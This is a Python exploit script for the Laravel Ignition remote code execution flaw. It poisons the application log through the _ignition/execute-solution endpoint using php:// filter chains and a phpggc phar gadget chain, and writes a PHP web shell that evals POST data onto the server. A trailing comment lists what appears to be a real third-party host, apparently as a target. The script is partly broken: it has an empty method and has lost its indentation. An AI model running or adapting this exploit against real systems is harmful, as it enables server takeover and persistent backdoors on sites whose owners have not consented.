# -*- coding=utf-8 -*-
# Author : Crispr
# Alter: zhzyker
import os
import requests
import sys
from urllib3.exceptions import InsecureRequestWarning

# Suppress only the single warning from urllib3 needed.
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

class EXP:
#这里还可以增加phpggc的使用链
__gadget_chains = {
"Laravel/RCE0":r"""
php -d "phar.readonly=0" ./phpggc Laravel/RCE0 file_put_contents .session.php '<? @eval($_POST["php_session_tmp"]);?>' --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"
""",
}

def __vul_check(self):
res = requests.get(self.__url,verify=False)
if res.status_code != 405 and "laravel" not in res.text:
print("[+]Vulnerability does not exist")
return False
return True

def __payload_send(self,payload):
header = {
"Accept": "application/json",
"x-forwarded-for": "127.0.0.1"
}
data = {
"solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
"parameters": {
"variableName": "fuckfuck",
"viewFile": ""
}
}
data["parameters"]["viewFile"] = payload

#print(data)
res = requests.post(self.__url, headers=header, json=data, verify=False)
return res

def __clear_log(self):
payload = "php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log"
return self.__payload_send(payload=payload)

def __generate_payload(self,gadget_chain):
generate_exp = self.__gadget_chains[gadget_chain]
#print(generate_exp)
exp = "".join(os.popen(generate_exp).readlines()).replace("\n","")+ 'a'
print("[+]exploit:")
#print(exp)
return exp

def __decode_log(self):
return self.__payload_send(
"php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log")

def __unserialize_log(self):
return self.__payload_send("phar://../storage/logs/laravel.log/test.txt")
#return self.__payload_send("phar://../storage/logs/laravel.log/")

def __rce(self):
text = str(self.__unserialize_log().text)
if "fuck_session" in text:
print("\n---------okokokokokokokok-gogogo--------\n")
#print(text)
#text = text[text.index(']'):].replace("}","").replace("]","") if text.find(']') != -1 else text
return text
text1 = text[:text.index('[')] if text.find('[') != -1 else text
print(text1)
print("\n")
text2 = text[text.index(']'):] if text.find(']') != -1 else text
return text2

def exp(self):
for gadget_chain in self.__gadget_chains.keys():
print("[*] Try to use %s for exploitation." % (gadget_chain))
self.__clear_log()
self.__clear_log()
self.__payload_send('A' * 2)
self.__payload_send(self.__generate_payload((gadget_chain)))
self.__decode_log()
print("[*] " + gadget_chain + " Result:")
print(self.__rce())
#self.__rce()

def check_success(self):


def __init__(self, target):
self.target = target
self.__url = requests.compat.urljoin(target, "_ignition/execute-solution")
#if not self.__vul_check():
#   print("[-] [%s] is seems not vulnerable." % (self.target))
#    print("[*] You can also call obj.exp() to force an attack.")
#else:
#    self.exp()
self.exp()

def main():
EXP(sys.argv[1])

if __name__ == "__main__":
main()

# http://api.cs9skin.com:5100/
